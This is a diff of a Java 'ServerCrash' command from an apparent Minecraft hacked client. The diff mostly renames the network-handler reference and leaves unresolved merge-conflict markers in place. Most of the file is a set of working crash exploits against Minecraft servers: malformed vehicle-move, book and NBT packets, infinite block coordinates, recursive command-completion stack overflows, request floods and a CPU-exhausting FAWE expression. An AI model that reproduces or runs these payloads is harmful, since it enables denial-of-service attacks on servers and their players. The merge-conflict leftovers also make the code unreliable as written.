@@ -5,6 +5,7 @@
 package net.shadow.client.feature.command.impl;
 
 import net.minecraft.client.MinecraftClient;
+import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.client.option.ChatVisibility;
 import net.minecraft.entity.Entity;
 import net.minecraft.entity.Entity.RemovalReason;
@@ -51,6 +52,7 @@ public class ServerCrash extends Command {
 
     @Override
     public void onExecute(String[] args) throws CommandException {
+        ClientPlayNetworkHandler theFuckingNetworkHandler = client.player.networkHandler;
         switch (args[0].toLowerCase()) {
             case "rider" -> {
                 Entity ridingEntity = client.player.getVehicle();
@@ -62,7 +64,7 @@ public class ServerCrash extends Command {
                 Vec3d forward = Vec3d.fromPolar(0, client.player.getYaw()).normalize().multiply(20000000.0F);
                 for (int i = 0; i < 100; i++) {
                     ridingEntity.updatePosition(client.player.getX() + forward.x, client.player.getY(), client.player.getZ() + forward.z);
-                    client.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
+                    theFuckingNetworkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Riding Crash Exploit");
             }
@@ -80,7 +82,7 @@ public class ServerCrash extends Command {
                     tag.put("title", NbtString.of(rndStr(2000)));
                     tag.put("pages", list);
                     crash.setNbt(tag);
-                    client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, crash));
+                    theFuckingNetworkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, crash));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Book Crash");
             }
@@ -94,26 +96,26 @@ public class ServerCrash extends Command {
                 NbtCompound fuck = new NbtCompound();
                 fuck.put("BlockEntityTag", nbt);
                 ez.setNbt(fuck);
-                client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, ez));
+                theFuckingNetworkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, ez));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Malformed NBT Crash");
             }
 
             case "move" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
                 for (int i = 0; i < 250; i++) {
-                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX() + (i * size), client.player.getY(), client.player.getZ() + (i * size), true));
+                    theFuckingNetworkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX() + (i * size), client.player.getY(), client.player.getZ() + (i * size), true));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Movement Crash");
             }
 
             case "papertest" -> {
                 int peenus = new IntegerArgumentParser().parse(args[1]);
-                client.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", peenus, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
+                theFuckingNetworkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", peenus, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent View Distance Crash");
             }
 
             case "chunkoob" -> {
-                client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 69, Double.POSITIVE_INFINITY), true)));
+                theFuckingNetworkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 69, Double.POSITIVE_INFINITY), true)));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent ChunkOOB Crash");
             }
 
@@ -125,7 +127,7 @@ public class ServerCrash extends Command {
             case "stackoverflow" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
                 String popper2 = "/execute as @e" + " as @e".repeat(size);
-                client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
+                theFuckingNetworkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Stackoverflow Crash");
             }
 
@@ -146,11 +148,12 @@ public class ServerCrash extends Command {
 
             case "lag" -> {
                 for (int i = 0; i < 3000000; i++) {
-                    client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
+                    theFuckingNetworkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
             }
 
+<<<<<<< HEAD
             case "lag2" -> {
                 for(int i = 0; i < 255; i++){
                     client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
@@ -158,6 +161,8 @@ public class ServerCrash extends Command {
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
             }
 
+=======
+>>>>>>> 08546d61283129fdfeb469a104f2baacfa6d05fe
             case "maptool" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
                 client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + size + " " + size + "");
@@ -165,7 +170,7 @@ public class ServerCrash extends Command {
             }
 
             case "fawe" -> {
-                client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
+                theFuckingNetworkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent FAWE Crash");
             }
         }
